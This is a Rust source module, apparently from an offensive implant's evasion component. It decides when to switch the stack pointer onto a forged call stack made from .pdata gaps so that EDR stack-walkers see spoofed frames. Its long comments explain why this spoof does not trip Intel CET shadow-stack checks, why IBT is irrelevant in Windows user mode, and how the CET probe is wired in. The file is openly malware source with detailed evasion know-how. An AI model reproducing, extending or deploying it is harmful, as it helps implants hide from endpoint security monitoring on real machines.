//! RSP-swap decision — pure logic (CET-corrected, 2026-08).
//!
//! Intel CET / the Windows user-mode shadow stack acts at every `ret`: the
//! CPU pops from RSP AND from the shadow stack, faulting (#CP) on mismatch.
//! **Whether a stack spoof #CPs under CET depends entirely on whether
//! execution ever `ret`s THROUGH a forged frame.** Two spoof classes:
//!
//! * **Return-through-forged-frame spoofs** (classic `push fake_RA; jmp
//!   target`, ReturnStub-gadget style): the target's `ret` pops the forged
//!   address from the data stack but the REAL one from the shadow stack →
//!   mismatch → #CP. These are genuinely CET-unsafe.
//! * **Unwinder-read-only spoofs** (this module's consumer — the gap-sea RSP
//!   swap in `nyx_implant_core::stack`): RSP is switched to the fake stack
//!   and the trampoline is entered via a normal `call`. Every `call` pushes
//!   the SAME return address to the data stack and the shadow stack
//!   (hardware does both), so every executed `ret` pops a value that a real
//!   `call` just pushed — matched pair, no #CP, on ANY host. The forged
//!   leaf-gap chain sits ABOVE the active call region and is only READ by
//!   EDR stack-walkers (`RtlVirtualUnwind` does not consult the shadow
//!   stack); it is never POPPED by execution. The shadow stack therefore
//!   never diverges, and user-mode shadow-stack enforcement does not block
//!   the swap.
//!
//! CET's other half, IBT, is a non-issue here: Windows enforces IBT only in
//! kernel mode — user-mode processes get shadow stacks only — so indirect
//! calls inside the trampoline/bridge need no `endbr64`.
//!
//! The decision below is therefore gaps-only: usable `.pdata` gaps → Execute,
//! regardless of the CET bit. The `cet_on` input is retained so every caller
//! keeps probing and reporting CET state (diagnostics + future call shapes
//! that might genuinely be CET-unsafe), but it no longer degrades this swap.
//!
//! ## Consistency with the live path (audited 2026-08)
//! The ONLY live consumers are `nyx_implant_core::stack::with_spoofed_stack`
//! (hot-path re-validation right before the `mov rsp`) and
//! `nyx-implant-win`'s bootstrap auto-arm — both call THIS function, so
//! there is no second, divergent copy of the decision. The `cet_on` input
//! comes from `nyx_implant_core::version::cet_active()`, which queries
//! `IsProcessorFeaturePresent(41)` — the SAME export + constant as
//! `nyx_implant_evasion::caller_spoof::is_cet_enabled`, so all probes agree
//! per-process. Both probes fail OPEN on resolver failure (they return
//! "CET off" when the export can't be resolved); under the corrected
//! decision that failure mode is now harmless either way, since CET state
//! does not gate execution.

#![cfg_attr(not(test), allow(dead_code))]

/// The swap decision returned by [`decide`].
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum SwapDecision {
    /// Safe to execute the RSP swap (gaps usable; CET state irrelevant — see
    /// module docs for the matched call/ret-pair invariant).
    Execute,
    /// Degrade to the no-swap floor. Carries the reason for diagnostics.
    Degrade(&'static str),
}

/// Pinned architectural invariant: the gap-sea swap NEVER pops a forged
/// frame. Execution enters the fake stack via `call` (matched push to data
/// + shadow stack) and every `ret` unwinds exactly those matched pushes; the
/// forged leaf-gap sea above the call region is unwinder-read-only. This is
/// the property that makes the swap CET-shadow-stack-safe, and it is what
/// [`decide`] relies on. Extracted as a pure predicate so a host test pins
/// it — if the swap geometry is ever changed to return THROUGH forged
/// frames (e.g. reintroducing a ReturnStub gadget path), this must flip to
/// `false` and `decide` must gate on `cet_on` again.
pub fn swap_never_pops_forged_frames() -> bool {
    true
}

/// Decide whether to execute the RSP swap given the runtime posture.
///
/// - `cet_on`: is user-mode CET / shadow stack active for this process?
///   (Win11 24H2+ opt-in per-process; probe at runtime in the live impl.)
///   Under the matched-pair invariant ([`swap_never_pops_forged_frames`])
///   this does NOT gate the swap — forged frames are never popped, so there
///   is no mismatched `ret` for the hardware to catch. Retained as an input
///   so callers keep probing (diagnostics) and so a future CET-unsafe call
///   shape has the state threaded through.
/// - `gaps_usable`: did the PdataGapScanner yield a non-empty GapPool?
///
/// Returns `Execute` whenever gaps are usable. An empty gap pool degrades
/// (nothing to spoof onto); that is the only remaining degrade path.
pub fn decide(cet_on: bool, gaps_usable: bool) -> SwapDecision {
    // CET state is deliberately NOT consulted: the swap never pops a forged
    // frame (module docs), so shadow-stack enforcement cannot fault it.
    // `_ =` keeps the input live (callers probe + report it) without
    // pretending it gates.
    _ = cet_on;
    if !gaps_usable {
        return SwapDecision::Degrade("no .pdata gaps — nothing to spoof onto");
    }
    if !swap_never_pops_forged_frames() {
        // Unreachable while the gap-sea geometry holds; the pinned test below
        // fails first if that geometry ever changes.
        return SwapDecision::Degrade("swap geometry would pop forged frames under CET");
    }
    SwapDecision::Execute
}

/// Convenience: is the decision to execute?
pub fn should_execute(cet_on: bool, gaps_usable: bool) -> bool {
    matches!(decide(cet_on, gaps_usable), SwapDecision::Execute)
}

#[cfg(test)]
mod tests {
    use super::*;

    /// THE pinned invariant: the swap never pops a forged frame. If the swap
    /// geometry in `implant-core/src/stack.rs` is ever changed so execution
    /// `ret`s through the forged gap chain, this test must be revisited and
    /// `decide` must start gating on `cet_on` again — a forged `ret` under
    /// shadow-stack enforcement is a hard #CP.
    #[test]
    fn swap_never_pops_forged_frames_holds() {
        assert!(swap_never_pops_forged_frames());
    }

    #[test]
    fn gaps_usable_executes_cet_off() {
        assert_eq!(decide(false, true), SwapDecision::Execute);
    }

    /// Headline CET behavior: shadow-stack enforcement does NOT degrade this
    /// swap, because execution never `ret`s through the forged frames (the
    /// gap sea is unwinder-read-only; every executed ret pops a call-pushed
    /// matched pair). The spoof stays ACTIVE on CET-on hosts — no
    /// call_plain-style degradation anywhere in the decision.
    #[test]
    fn gaps_usable_executes_even_with_cet_on() {
        assert_eq!(decide(true, true), SwapDecision::Execute);
    }

    #[test]
    fn no_gaps_degrades_regardless_of_cet() {
        // The only remaining degrade path: nothing to spoof onto.
        assert_eq!(
            decide(false, false),
            SwapDecision::Degrade("no .pdata gaps — nothing to spoof onto")
        );
        assert_eq!(
            decide(true, false),
            SwapDecision::Degrade("no .pdata gaps — nothing to spoof onto")
        );
    }

    #[test]
    fn should_execute_helper_matches_decide() {
        assert!(should_execute(false, true));
        assert!(should_execute(true, true)); // CET on no longer degrades
        assert!(!should_execute(false, false));
        assert!(!should_execute(true, false));
    }
}
